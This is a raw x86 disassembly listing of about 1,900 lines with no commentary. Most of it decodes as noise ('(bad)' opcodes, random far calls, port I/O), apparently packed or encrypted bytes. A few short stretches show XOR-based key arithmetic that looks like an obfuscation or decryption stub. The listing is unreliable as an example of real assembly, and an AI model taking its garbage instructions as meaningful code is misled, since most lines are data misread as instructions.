  410a81:	je     0x410a79
  410a83:	mov    edi,0x16b16310
  410a88:	dec    ecx
  410a89:	out    0xfd,eax
  410a8b:	repz aam 0x49
  410a8e:	mov    WORD PTR [eax-0x1e5bfc0c],fs
  410a94:	imul   dl
  410a96:	and    al,dl
  410a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a99:	push   ecx
  410a9a:	(bad)  
  410a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a9c:	inc    ax
  410a9e:	push   ecx
  410a9f:	(bad)  
  410aa0:	pusha  
  410aa1:	sub    eax,0xb8ae8b50
  410aa6:	fldcw  WORD PTR [esp+ebx*1]
  410aa9:	xchg   ebx,eax
  410aaa:	test   eax,0x7127d60e
  410aaf:	sbb    BYTE PTR gs:[edx-0x227d9d89],dh
  410ab6:	cli    
  410ab7:	mov    edx,ebx
  410ab9:	lahf   
  410aba:	mov    ds:0x7e483d91,al
  410abf:	xor    BYTE PTR [ebx],bh
  410ac1:	or     eax,0x833f81a8
  410ac6:	mov    esi,0x78dfce06
  410acb:	push   eax
  410acc:	aaa    
  410acd:	adc    edx,DWORD PTR ds:0x26732302
  410ad3:	outs   dx,DWORD PTR ds:[esi]
  410ad4:	out    0x72,al
  410ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ad7:	pop    edi
  410ad8:	ja     0x410a9e
  410ada:	repz test ax,0x1a46
  410adf:	xchg   ebp,eax
  410ae0:	xor    al,0x53
  410ae3:	xor    esi,DWORD PTR [eax-0x16df77a]
  410ae9:	jecxz  0x410b26
  410aeb:	rcl    BYTE PTR [edx-0x70],1
  410aee:	lahf   
  410aef:	aas    
  410af0:	dec    ebx
  410af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af2:	ja     0x410af1
  410af4:	sbb    DWORD PTR [ebx-0x15e279e6],edi
  410afa:	push   0x7a818b35
  410aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b00:	dec    esp
  410b01:	std    
  410b02:	and    BYTE PTR [edi],bh
  410b04:	fs out 0x6e,eax
  410b07:	mov    ebx,DWORD PTR [ecx+0x51]
  410b0a:	push   edi
  410b0b:	shr    DWORD PTR [edx],cl
  410b0d:	shl    DWORD PTR [ebp-0x49],0xf5
  410b11:	jno    0x410b2a
  410b13:	sub    edi,eax
  410b15:	or     BYTE PTR [ebx-0x1a],al
  410b18:	setae  BYTE PTR [ebx+0x2b7916f5]
  410b1f:	sbb    esi,ecx
  410b21:	(bad)  
  410b22:	shl    ch,1
  410b24:	iret   
  410b25:	mov    eax,0xcc936009
  410b2a:	inc    esi
  410b2b:	pop    ds
  410b2c:	xchg   edi,eax
  410b2d:	cmp    bl,BYTE PTR [ecx+0x1d]
  410b30:	dec    esp
  410b31:	call   0x78e7:0xbde11768
  410b38:	lds    edi,FWORD PTR es:[eax]
  410b3b:	ret    
  410b3c:	xchg   ecx,eax
  410b3d:	push   esi
  410b3e:	cmc    
  410b3f:	xchg   edi,eax
  410b40:	stos   DWORD PTR es:[edi],eax
  410b41:	js     0x410aed
  410b43:	loop   0x410b69
  410b45:	inc    edx
  410b46:	sbb    ch,BYTE PTR [ebx]
  410b48:	not    DWORD PTR [esi]
  410b4a:	jmp    0x2a63912f
  410b4f:	cmp    dh,BYTE PTR [eax]
  410b51:	ficom  WORD PTR ds:0xeea9939d
  410b57:	sub    DWORD PTR [edi+0x1f],esp
  410b5a:	in     eax,dx
  410b5b:	cld    
  410b5c:	or     bh,BYTE PTR [ecx]
  410b5e:	fs dec eax
  410b60:	add    BYTE PTR [ebp*4-0x6fe2d079],ah
  410b67:	inc    eax
  410b68:	pusha  
  410b69:	in     eax,dx
  410b6a:	repz inc esi
  410b6c:	jg     0x410ba6
  410b6e:	or     eax,0x548000b4
  410b73:	inc    ecx
  410b74:	dec    ebp
  410b75:	or     bh,0x73
  410b78:	add    eax,0xe2e6599f
  410b7d:	adc    BYTE PTR [eax-0x1ae3d221],al
  410b83:	ret    0xc5b9
  410b86:	int3   
  410b87:	xchg   esp,eax
  410b88:	fist   WORD PTR [edx-0x179d2d9d]
  410b8e:	call   0x2794267d
  410b93:	xor    al,0x4a
  410b95:	or     eax,0xcef38088
  410b9a:	mov    bh,BYTE PTR [esi-0x5bf6411b]
  410ba0:	rol    DWORD PTR [ebp+0x26],1
  410ba3:	sub    esp,esp
  410ba5:	pop    edi
  410ba6:	scas   eax,DWORD PTR es:[edi]
  410ba7:	mov    ebp,0xff26b9e3
  410bac:	out    0x16,al
  410bae:	jle    0x410b8c
  410bb0:	daa    
  410bb1:	aam    0x38
  410bb3:	(bad)  
  410bb4:	xchg   esp,eax
  410bb5:	les    ecx,FWORD PTR [edx]
  410bb7:	out    0x6c,al
  410bb9:	add    al,0x81
  410bbb:	retf   0x47eb
  410bbe:	adc    edi,edx
  410bc0:	add    al,0xfe
  410bc2:	sti    
  410bc3:	dec    eax
  410bc4:	rcl    BYTE PTR [eax+eiz*8-0xea008b6],cl
  410bcb:	pop    edx
  410bcc:	(bad)  
  410bcd:	loope  0x410c3a
  410bcf:	xchg   ebx,eax
  410bd0:	in     al,0x66
  410bd2:	(bad)  
  410bd4:	mov    ds:0xba979b20,eax
  410bd9:	jne    0x410b6e
  410bdb:	mov    ch,0x13
  410bdd:	dec    edi
  410bde:	pop    ds
  410bdf:	xor    cl,bl
  410be1:	jp     0x410bb7
  410be3:	shr    BYTE PTR [edx+0x70],1
  410be6:	repz pause 
  410be9:	push   0xcdc39ab2
  410bee:	cwde   
  410bef:	mov    al,0xce
  410bf1:	imul   esp,DWORD PTR [esi+0x1a],0xffffff9a
  410bf5:	cmp    al,0xea
  410bf7:	std    
  410bf8:	sar    esp,cl
  410bfa:	fsubr  DWORD PTR [edi]
  410bfc:	in     al,dx
  410bfd:	add    al,0xd1
  410bff:	int    0x35
  410c01:	fimul  DWORD PTR [ecx]
  410c03:	aam    0xe
  410c05:	lea    ecx,[eax+0x72e6481c]
  410c0b:	and    eax,0x3c22eccb
  410c10:	jno    0x410c0a
  410c12:	xor    ch,bl
  410c14:	out    0xce,al
  410c16:	lock mov dh,0x15
  410c19:	data16 aam 0x72
  410c1c:	inc    DWORD PTR [ebx]
  410c1e:	bound  eax,QWORD PTR [edx+0x5d]
  410c21:	push   0x6b204b2d
  410c26:	dec    eax
  410c27:	mov    esp,0x2b6997a1
  410c2c:	and    ch,ah
  410c2e:	cmp    DWORD PTR ds:0x4e6d6928,ecx
  410c34:	mov    ds:0x11665ad7,al
  410c39:	mov    eax,ds:0xfc3c71db
  410c3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c3f:	sub    DWORD PTR [ecx-0x1],0xb
  410c43:	js     0x410c5c
  410c45:	cmp    al,0x6d
  410c47:	mov    eax,ds:0x8b416838
  410c4c:	xchg   esp,eax
  410c4d:	push   es
  410c4e:	jnp    0x410c27
  410c50:	mov    ebx,ecx
  410c52:	repz cmp esp,esi
  410c55:	out    0x40,al
  410c57:	or     al,0xe5
  410c59:	pop    ebx
  410c5a:	jl     0x410bfb
  410c5c:	dec    ebx
  410c5d:	outs   dx,BYTE PTR ds:[esi]
  410c5e:	in     al,0xed
  410c60:	adc    dl,BYTE PTR [ebx-0x574c7074]
  410c66:	cmp    al,0x19
  410c68:	(bad)  
  410c69:	mov    edx,0xad530985
  410c6e:	cmc    
  410c6f:	push   edx
  410c70:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  410c72:	or     esi,esi
  410c74:	jne    0x410c55
  410c76:	in     eax,0xd3
  410c78:	daa    
  410c79:	ja     0x410cb6
  410c7b:	mul    DWORD PTR [ecx+0x1a]
  410c7e:	fwait
  410c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c80:	or     DWORD PTR [ecx+0x3c],0x30
  410c84:	inc    ebx
  410c85:	stos   BYTE PTR es:[edi],al
  410c86:	push   cs
  410c87:	lods   al,BYTE PTR ds:[esi]
  410c88:	and    BYTE PTR [edx+0x5e],0x2c
  410c8c:	jp     0x410c59
  410c8e:	test   dl,al
  410c90:	lods   al,BYTE PTR ds:[esi]
  410c91:	add    edx,DWORD PTR [ebp+0x371b33af]
  410c97:	mov    cl,0xba
  410c99:	xchg   BYTE PTR [eax+eiz*1-0x62],ah
  410c9d:	xchg   ebp,eax
  410c9e:	sub    al,0x1f
  410ca0:	mov    edi,0x318062ef
  410ca5:	add    esi,DWORD PTR [edx+0x155535db]
  410cab:	dec    edi
  410cac:	aam    0xb
  410cae:	push   ds
  410caf:	sbb    ecx,0xffffffe2
  410cb2:	sar    BYTE PTR [edx],0x16
  410cb5:	in     al,0x88
  410cb7:	cld    
  410cb8:	(bad)  [ebx-0x3c]
  410cbb:	pop    es
  410cbc:	les    ebp,FWORD PTR [ebx]
  410cbe:	inc    esp
  410cbf:	push   cs
  410cc0:	pop    ebp
  410cc1:	sub    al,0xec
  410cc3:	mov    DWORD PTR [ecx*2+0x19c27572],edi
  410cca:	retf   
  410ccb:	mov    ebp,DWORD PTR [edi+0x18a8ed0e]
  410cd1:	xchg   BYTE PTR [ebx],dh
  410cd3:	arpl   WORD PTR [ecx+0x2],di
  410cd6:	sub    esi,esp
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x4345c7
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x4344e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43460b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434613,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4345c7,0x434583
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434607,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43458f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0x7b8aa3a2],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410de2
  410d7a:	std    
  410d7b:	push   ds
  410d7c:	gs into 
  410d7e:	std    
  410d7f:	ss in  eax,dx
  410d81:	aam    0xf
  410d83:	pop    ds
  410d84:	aam    0xac
  410d86:	cmp    ecx,DWORD PTR [ecx+0x4a]
  410d89:	pushf  
  410d8a:	mov    cl,0xde
  410d8c:	femms  
  410d8e:	ins    DWORD PTR es:[edi],dx
  410d8f:	loope  0x410d77
  410d91:	xor    DWORD PTR [edx-0x3268a82f],0x5e89e715
  410d9b:	(bad)  
  410d9c:	bound  ecx,QWORD PTR [edi]
  410d9e:	imul   dx,WORD PTR [esi],0xffcc
  410da2:	(bad)  
  410da3:	mov    ecx,DWORD PTR [ebx+0x26]
  410da6:	pop    ds
  410da7:	mov    dh,0x67
  410da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410daa:	sbb    esi,DWORD PTR [edx-0x4dd99c1f]
  410db0:	sbb    eax,eax
  410db2:	rol    BYTE PTR [esi],cl
  410db4:	scas   eax,DWORD PTR es:[edi]
  410db5:	mov    esi,0x41f28fa
  410dba:	and    BYTE PTR [edx+0x6d],bl
  410dbd:	push   eax
  410dbe:	sbb    eax,0x7d528040
  410dc3:	(bad)  
  410dc4:	icebp  
  410dc5:	mov    bh,0xe5
  410dc7:	inc    ecx
  410dc8:	push   ecx
  410dc9:	scas   al,BYTE PTR es:[edi]
  410dca:	mov    ebx,0x81572609
  410dcf:	(bad)  
  410dd1:	cmp    eax,0x218c2cc
  410dd6:	(bad)  
  410dd7:	daa    
  410dd8:	test   BYTE PTR [esi],ah
  410dda:	data16 lahf 
  410ddc:	pop    ebp
  410ddd:	add    eax,0xd709a483
  410de2:	adc    ebp,DWORD PTR [ecx+edi*8-0x4aba5594]
  410de9:	xchg   esi,eax
  410dea:	mov    dh,0x25
  410dec:	sbb    DWORD PTR [esi-0x3f],0xffffffd8
  410df0:	dec    eax
  410df1:	fisubr DWORD PTR [eax-0x6adfc772]
  410df7:	fbstp  TBYTE PTR [edx]
  410df9:	outs   dx,DWORD PTR ds:[esi]
  410dfa:	paddw  mm0,mm4
  410dfd:	inc    eax
  410dfe:	pop    es
  410dff:	sbb    al,0x96
  410e01:	std    
  410e02:	xor    BYTE PTR [ecx],0xa
  410e05:	das    
  410e06:	xor    ecx,DWORD PTR [ebx-0x132891b9]
  410e0c:	sub    eax,edi
  410e0e:	div    DWORD PTR [ebx+edx*4]
  410e11:	rcr    BYTE PTR [ebx+eax*8+0x1],0x98
  410e16:	rcl    ebx,0xb2
  410e19:	pop    edx
  410e1a:	imul   esi,eax,0xffffffc8
  410e1d:	mov    edi,DWORD PTR [esi-0x5da20f49]
  410e23:	call   0x32b694de
  410e28:	je     0x410dcf
  410e2a:	sbb    cl,0x25
  410e2d:	cmp    DWORD PTR [edi-0x2f251bd7],edi
  410e33:	div    ebx
  410e35:	fdivr  st,st(6)
  410e37:	stos   DWORD PTR es:[edi],eax
  410e38:	pop    edi
  410e39:	mov    dl,0xbc
  410e3b:	(bad)  
  410e3c:	adc    eax,0x14cb37d7
  410e41:	ret    
  410e42:	mov    eax,ds:0x97b4b24c
  410e47:	clc    
  410e48:	push   ebp
  410e49:	pop    esi
  410e4a:	cwde   
  410e4b:	jle    0x410dde
  410e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e4e:	mov    edx,0x6da8ff11
  410e53:	add    DWORD PTR ds:0x44ae31e,edx
  410e59:	idiv   ah
  410e5b:	popf   
  410e5c:	adc    BYTE PTR [edx-0x4ce6cd7b],bh
  410e62:	bound  ecx,QWORD PTR [edi]
  410e64:	mov    cl,bl
  410e66:	(bad)  [ebp-0x34e42949]
  410e6c:	jecxz  0x410eeb
  410e6e:	dec    eax
  410e6f:	mov    eax,ds:0x2785f7eb
  410e74:	ja     0x410e04
  410e76:	jbe    0x410e79
  410e78:	fbld   TBYTE PTR [ebp+0x22]
  410e7b:	(bad)  
  410e7c:	mov    esp,0xc6b6343d
  410e81:	push   es
  410e82:	xchg   edx,eax
  410e83:	jns    0x410e16
  410e85:	leave  
  410e86:	pop    es
  410e87:	pop    eax
  410e88:	icebp  
  410e89:	aad    0x1d
  410e8b:	fisttp QWORD PTR [edi]
  410e8d:	dec    esp
  410e8e:	mov    DWORD PTR [ebp-0x8],ebx
  410e91:	mov    dl,0x1c
  410e93:	sub    al,0x3c
  410e95:	loop   0x410e6a
  410e97:	lock addr16 cmc 
  410e9a:	and    esi,ebp
  410e9c:	inc    esp
  410e9d:	ja     0x410eab
  410e9f:	int3   
  410ea0:	outs   dx,DWORD PTR ds:[esi]
  410ea1:	pop    ebp
  410ea2:	jl     0x410eb8
  410ea4:	iret   
  410ea5:	and    al,BYTE PTR [ebx+ecx*8-0x48d2bbce]
  410eac:	add    BYTE PTR [eax+0x18d23d47],bh
  410eb2:	jle    0x410e37
  410eb4:	scas   al,BYTE PTR es:[edi]
  410eb5:	push   ebx
  410eb6:	das    
  410eb7:	mov    esi,edi
  410eb9:	push   ds
  410eba:	add    esp,DWORD PTR [ecx+0x75e79ccd]
  410ec0:	sub    cl,0x45
  410ec3:	mov    DWORD PTR [edi+0x2f8e13ca],eax
  410ec9:	pusha  
  410eca:	gs sub al,0x9f
  410ecd:	ins    DWORD PTR es:[edi],dx
  410ece:	dec    esi
  410ecf:	mov    ds:0xa682274f,al
  410ed4:	mov    ch,0xce
  410ed6:	cmc    
  410ed7:	inc    eax
  410ed8:	inc    edx
  410ed9:	jle    0x410efb
  410edb:	rol    cl,1
  410edd:	addr16 popf 
  410edf:	gs push eax
  410ee1:	das    
  410ee2:	mov    edi,0x57142a69
  410ee7:	push   esp
  410ee8:	dec    esi
  410ee9:	mov    al,0xf2
  410eeb:	xchg   edi,eax
  410eec:	popa   
  410eed:	sysenter 
  410eef:	add    DWORD PTR [eax+0x103ce812],ebx
  410ef5:	inc    edx
  410ef6:	std    
  410ef7:	je     0x410f55
  410ef9:	(bad)  
  410efa:	into   
  410efb:	pop    ds
  410efc:	dec    ecx
  410efd:	cld    
  410efe:	pop    ss
  410eff:	lea    ebp,[ebp+0x7e5552b3]
  410f05:	add    al,0xd3
  410f07:	mov    ebx,0xac7148d9
  410f0c:	imul   esi,DWORD PTR [edx+0x70],0xe
  410f10:	div    BYTE PTR [esp+eiz*4-0x15d7a173]
  410f17:	sbb    eax,0x8347f254
  410f1c:	add    dl,BYTE PTR [esi]
  410f1e:	ret    0x72
  410f21:	jne    0x410f63
  410f23:	out    0xeb,eax
  410f25:	mov    ds:0x3bb658e8,al
  410f2a:	nop
  410f2b:	scas   al,BYTE PTR es:[edi]
  410f2c:	push   ss
  410f2d:	push   0x8
  410f2f:	call   0xf828:0xc81c54a8
  410f36:	lods   eax,DWORD PTR ds:[esi]
  410f37:	xor    eax,0x9018346f
  410f3c:	add    ah,bl
  410f3e:	and    al,0x7
  410f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f41:	scas   al,BYTE PTR es:[edi]
  410f42:	xchg   ebp,eax
  410f43:	xchg   ebx,eax
  410f44:	sti    
  410f45:	jnp    0x410f43
  410f47:	test   al,0x1b
  410f49:	jg     0x410fa1
  410f4b:	push   esi
  410f4c:	(bad)  
  410f4e:	fbld   TBYTE PTR [eax+0x1e]
  410f51:	fwait
  410f52:	jge    0x410eec
  410f54:	sbb    esi,ebx
  410f56:	and    al,0xba
  410f58:	or     al,0x9a
  410f5a:	mov    WORD PTR [ebx+edi*1-0x281c3003],fs
  410f61:	inc    edi
  410f62:	and    ebp,DWORD PTR [ebp+0x470fb0c0]
  410f68:	int3   
  410f69:	jmp    0xcc066620
  410f6e:	dec    eax
  410f6f:	xor    ebx,DWORD PTR [eax+0x16]
  410f72:	aas    
  410f73:	imul   esi,DWORD PTR [eax+0x3aa81582],0xa3326554
  410f7d:	xor    al,0x2d
  410f7f:	ret    0x6b4b
  410f82:	mov    dh,0xfd
  410f84:	inc    edi
  410f85:	cmp    al,0xa2
  410f87:	add    ecx,DWORD PTR [esi-0x49]
  410f8a:	dec    ecx
  410f8b:	cmp    al,0xa9
  410f8d:	jge    0x410fce
  410f8f:	dec    edx
  410f90:	push   ebp
  410f91:	cmc    
  410f92:	cmp    edx,ebp
  410f94:	js     0x410faa
  410f96:	(bad)  
  410f97:	inc    esi
  410f98:	rcr    dh,0x4e
  410f9b:	sbb    BYTE PTR [eax+0x5f],cl
  410f9e:	dec    ebp
  410f9f:	mov    ?,WORD PTR [ebx-0x28]
  410fa2:	(bad)  
  410fa3:	push   ds
  410fa4:	pusha  
  410fa5:	outs   dx,BYTE PTR ds:[esi]
  410fa6:	(bad)  
  410fa7:	(bad)  
  410fa8:	cmp    DWORD PTR [ebx+0x79852df0],edx
  410fae:	inc    DWORD PTR [ebx+0x2]
  410fb1:	in     al,dx
  410fb2:	pop    esi
  410fb3:	pop    ebp
  410fb4:	outs   dx,BYTE PTR ds:[esi]
  410fb5:	js     0x410fd0
  410fb7:	test   eax,0x59f96547
  410fbc:	pop    ebx
  410fbd:	pop    ebx
  410fbe:	jl     0x410fe0
  410fc0:	sub    BYTE PTR [esi-0x3c],dl
  410fc3:	fwait
  410fc4:	pop    esi
  410fc5:	mov    cl,0x34
  410fc7:	mov    edx,DWORD PTR [ebx]
  410fc9:	stos   DWORD PTR es:[edi],eax
  410fca:	nop
  410fcb:	repnz cmp ah,ah
  410fce:	mov    ah,0xaf
  410fd0:	adc    eax,0x2e852a79
  410fd5:	xor    bl,BYTE PTR [edx+0x738b72b7]
  410fdb:	ss cmc 
  410fdd:	sub    edi,DWORD PTR [ecx+esi*2-0x6bb679e6]
  410fe4:	xchg   esi,eax
  410fe5:	adc    ebp,DWORD PTR [ebx+0x7b]
  410fe8:	xor    DWORD PTR [edx],esp
  410fea:	imul   esp,DWORD PTR [ebp+0x50],0xffffffae
  410fee:	jle    0x41101d
  410ff0:	xchg   BYTE PTR [eax+0x5c],bh
  410ff3:	rol    DWORD PTR [eax+ebp*8+0x64],cl
  410ff7:	out    0xfd,eax
  410ff9:	int3   
  410ffa:	mov    esp,0xe5bd1e64
  410fff:	mov    ds:0x3d2c09ab,al
  411004:	js     0x411017
  411006:	icebp  
  411007:	xlat   BYTE PTR ds:[ebx]
  411008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411009:	jg     0x411036
  41100b:	test   eax,0x63ca5904
  411010:	sub    al,0x72
  411012:	ds addr16 call 0x67c1:0x812afa4b
  41101b:	(bad)  
  41101c:	int    0xff
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0xe7b14754
  411040:	cmp    eax,0x7e4f68d2
  411045:	jle    0x410fe4
  411047:	js     0x4110c7
  411049:	jle    0x41100b
  41104b:	pop    eax
  41104c:	mov    ds:0x9b699f2,eax
  411051:	jne    0x410fe7
  411053:	adc    DWORD PTR [edi+0xa],ebp
  411056:	stos   BYTE PTR es:[edi],al
  411057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411058:	dec    esp
  411059:	lock ins DWORD PTR es:[edi],dx
  41105b:	int3   
  41105c:	dec    ebp
  41105d:	ror    DWORD PTR [edx-0x6e],0x5b
  411061:	add    bl,BYTE PTR [ebx-0x7615b5e]
  411067:	(bad)  
  411068:	mov    esi,0x4af124be
  41106d:	in     al,dx
  41106e:	aam    0x35
  411070:	pop    esp
  411071:	adc    bl,BYTE PTR [edx+edi*1]
  411074:	imul   edx,DWORD PTR [ebp+0x4d],0xffffffda
  411078:	dec    eax
  411079:	mov    gs:0x1c4b6e18,al
  41107f:	out    0x2d,eax
  411081:	push   ss
  411082:	jecxz  0x411024
  411084:	pop    ss
  411085:	popf   
  411086:	push   ss
  411087:	ret    
  411088:	cwde   
  411089:	or     al,0x32
  41108b:	mov    ebp,0x550077b2
  411090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411091:	jl     0x4110eb
  411093:	(bad)  
  411094:	xchg   ecx,eax
  411095:	mov    ah,0xbc
  411097:	mov    BYTE PTR [esi-0x29],ch
  41109a:	popa   
  41109b:	dec    esi
  41109c:	mov    ah,0xb5
  41109e:	sub    bl,BYTE PTR ds:0x5553ac97
  4110a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110a5:	and    al,BYTE PTR [eax+0x30]
  4110a8:	inc    edx
  4110a9:	sbb    esi,edi
  4110ab:	xchg   sp,ax
  4110ad:	call   0x205f:0x451ab2b8
  4110b4:	push   di
  4110b6:	and    bl,BYTE PTR [edx-0x43c084ed]
  4110bc:	(bad)  
  4110bd:	pop    ds
  4110be:	ret    
  4110bf:	jne    0x4110ea
  4110c1:	fwait
  4110c2:	or     dl,BYTE PTR [edi]
  4110c4:	jecxz  0x41109c
  4110c6:	and    eax,0x61587baf
  4110cb:	mov    cl,0xd1
  4110cd:	inc    BYTE PTR [esp+eiz*2]
  4110d0:	jmp    0x4110d1
  4110d2:	sbb    esi,DWORD PTR ds:0xe011d3ea
  4110d8:	scas   eax,DWORD PTR es:[edi]
  4110d9:	fistp  WORD PTR [ebx+0x5dad1c17]
  4110df:	test   DWORD PTR [esi+0x12],0x9b80915
  4110e6:	xchg   ch,bl
  4110e8:	sahf   
  4110e9:	cdq    
  4110ea:	popa   
  4110eb:	dec    esp
  4110ec:	jne    0x411153
  4110ee:	sar    bh,cl
  4110f0:	xor    DWORD PTR [eax-0x34],edi
  4110f3:	cmp    DWORD PTR [edi+ecx*4+0x4b],esp
  4110f7:	pop    edx
  4110f8:	loope  0x411098
  4110fa:	fild   DWORD PTR [ecx-0x4d41d696]
  411100:	inc    esp
  411101:	mov    esp,0x258212f1
  411106:	int3   
  411107:	mov    WORD PTR [esp+edi*8],?
  41110a:	lds    ebx,FWORD PTR [edx]
  41110c:	mov    DWORD PTR [edi+edi*1-0x4f],esi
  411110:	inc    edx
  411111:	cmp    DWORD PTR [esp+eiz*8],edx
  411114:	jno    0x411144
  411116:	mov    WORD PTR ds:0x376b3890,?
  41111c:	clc    
  41111d:	sti    
  41111e:	mov    edx,0x60d48ae9
  411123:	rol    BYTE PTR [eax],0x2f
  411126:	fstp   QWORD PTR [ecx+eiz*4]
  411129:	ds leave 
  41112b:	and    DWORD PTR [eax],ebx
  41112d:	sbb    dh,BYTE PTR [ebx]
  41112f:	jno    0x411153
  411131:	pop    esp
  411132:	dec    eax
  411133:	gs loop 0x411134
  411136:	push   edx
  411137:	mov    ebp,fs
  411139:	xchg   ebp,eax
  41113a:	add    dh,BYTE PTR [edx-0x468415aa]
  411140:	xor    eax,esp
  411142:	div    eax
  411144:	pop    eax
  411145:	inc    edi
  411146:	leave  
  411147:	out    0x6d,al
  411149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41114a:	adc    cl,dh
  41114c:	retf   0x8b8
  41114f:	int    0xb5
  411151:	or     dl,bh
  411153:	mov    ds:0x1f7ef020,al
  411158:	push   ss
  411159:	or     eax,0x67664704
  41115e:	fistp  QWORD PTR [edi-0x2]
  411161:	xlat   BYTE PTR ds:[ebx]
  411162:	add    al,0xf8
  411164:	xor    edi,DWORD PTR [edi]
  411166:	mov    ecx,0x4a1f3b1
  41116b:	fwait
  41116c:	push   cs
  41116d:	mov    edi,0xcac495fb
  411172:	shr    DWORD PTR [ebx+0x7a],0x7c
  411176:	or     BYTE PTR [eax+eiz*4-0x29],0x95
  41117b:	push   es
  41117c:	sub    al,0x19
  41117e:	xchg   edi,eax
  41117f:	out    0xcb,al
  411181:	outs   dx,DWORD PTR ds:[esi]
  411182:	retf   
  411183:	pusha  
  411184:	scas   eax,DWORD PTR es:[edi]
  411185:	shr    BYTE PTR [ebp-0x2e],0xea
  411189:	and    eax,0xbf4fe698
  41118e:	jo     0x4111e1
  411190:	lds    ebp,FWORD PTR [edx-0x13ddebfa]
  411196:	fnstsw WORD PTR [ebp+0x3abefc6d]
  41119c:	mov    ebp,0x3966785c
  4111a1:	sub    DWORD PTR [edx-0x28],ecx
  4111a4:	shr    BYTE PTR [eax-0x9051f9c],cl
  4111aa:	mov    edx,0x35fa483d
  4111af:	in     al,0x6a
  4111b1:	inc    edx
  4111b2:	push   eax
  4111b3:	inc    eax
  4111b4:	test   DWORD PTR [ebx+eiz*2+0x64],ecx
  4111b8:	arpl   WORD PTR [edx-0x32],bx
  4111bb:	std    
  4111bc:	(bad)  
  4111bd:	jne    0x4111e0
  4111bf:	outs   dx,BYTE PTR ds:[esi]
  4111c0:	sbb    eax,0xc0726b52
  4111c5:	mov    bl,0x84
  4111c7:	adc    DWORD PTR [eax+0x3a3c5915],0xffffff92
  4111ce:	shr    BYTE PTR [eax],0xd9
  4111d1:	aam    0xc5
  4111d3:	or     BYTE PTR [edx+0x52],cl
  4111d6:	loope  0x411178
  4111d8:	retf   0x46b4
  4111db:	(bad)  
  4111dc:	scas   eax,DWORD PTR es:[edi]
  4111dd:	and    ecx,edx
  4111df:	(bad)  
  4111e1:	pop    ecx
  4111e2:	and    DWORD PTR [edx+0x28f1894c],edx
  4111e8:	(bad)  
  4111e9:	jmp    0x4111bd
  4111eb:	ret    0x6e15
  4111ee:	sbb    BYTE PTR [ebx],ah
  4111f0:	test   al,0xd
  4111f2:	ss xchg edi,eax
  4111f4:	mov    ds:0xb7a7e8ca,al
  4111f9:	mov    ecx,0xe2c9b61f
  4111fe:	xchg   esi,eax
  4111ff:	jg     0x41126b
  411201:	(bad)  
  411202:	fbstp  TBYTE PTR [ebx+0x62]
  411205:	imul   ecx,DWORD PTR [ebp+0x2ee2f5a0],0x25
  41120c:	sub    eax,0x45386a6b
  411211:	test   eax,0xf5193cf5
  411216:	outs   dx,BYTE PTR ds:[esi]
  411217:	or     ah,BYTE PTR [edi]
  411219:	adc    al,0x3
  41121b:	mov    esp,0xb2008add
  411220:	push   cs
  411221:	xor    DWORD PTR [edi],edi
  411223:	shr    BYTE PTR [edx+0x4e],0x3a
  411227:	aaa    
  411228:	fwait
  411229:	push   0x356122c4
  41122e:	pop    ds
  41122f:	scas   eax,DWORD PTR es:[edi]
  411230:	sahf   
  411231:	pop    ds
  411232:	push   0x4e
  411234:	xchg   BYTE PTR [ebx+0x44],al
  411237:	cmp    eax,DWORD PTR [esi]
  411239:	add    DWORD PTR [esi+0x2321dc21],ebx
  41123f:	xor    bl,0x25
  411242:	es jo  0x41125a
  411245:	push   ss
  411246:	dec    eax
  411247:	sub    BYTE PTR [eax],al
  411249:	xor    eax,0x8fab4a11
  41124e:	push   edi
  41124f:	(bad)  
